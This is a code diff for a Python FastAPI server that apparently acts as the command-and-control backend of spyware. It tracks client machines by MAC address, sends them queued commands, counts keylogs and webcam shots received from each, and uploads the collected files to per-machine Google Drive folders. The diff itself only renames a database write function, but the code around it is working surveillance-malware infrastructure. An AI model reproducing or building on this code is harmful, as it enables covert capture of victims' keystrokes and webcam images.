@@ -1,4 +1,4 @@
-from db_utils import load_db, write_db
+from db_utils import load_db, update_db
 from fastapi import Request
 from driveapi import upload_file_from_file, create_folder
 from typing import List, Dict
@@ -16,7 +16,7 @@ def handle_first_command(request: Request) -> Dict[str, List[str]]:
         return NO_COMMANDS
     else:
         db[mac]['last_datetime'] = date_time
-        write_db(db)
+        update_db(db)
         return get_commands(mac_address=mac, db=db)
 
 
@@ -25,7 +25,7 @@ def handle_command_request(request: Request) -> Dict[str, List[str]]:
     date_time = request.headers['Date']
     mac = request.headers['MAC-Address']
     db[mac]['last_datetime'] = date_time
-    write_db(db)
+    update_db(db)
     return get_commands(mac_address=mac, db=db)
 
 
@@ -37,7 +37,7 @@ def initialize_new_client(mac_address: str, datetime: str, db: dict) -> None:
         'webcam_shots_taken': 0,
         'keylogs_received': 0
     }
-    write_db(db)
+    update_db(db)
     create_folder(mac_address)
 
 
@@ -47,7 +47,7 @@ def get_commands(mac_address: str, db: dict) -> Dict[str, List[str]]:
         return NO_COMMANDS
     else:
         db[mac_address]['commands'] = []
-        write_db(db)
+        update_db(db)
         return {'commands': commands}
 
 
@@ -62,7 +62,7 @@ async def upload_file(request: Request, filename: str, db_identifier: str,
     with open(TEMP_FILE, 'wb') as f:
         f.write(data)
     db[mac][db_identifier] += 1
-    write_db(db)
+    update_db(db)
     upload_file_from_file(title=title, src_filename=TEMP_FILE,
                           mime_type=request.headers['Content-Type'], parent=mac)
 
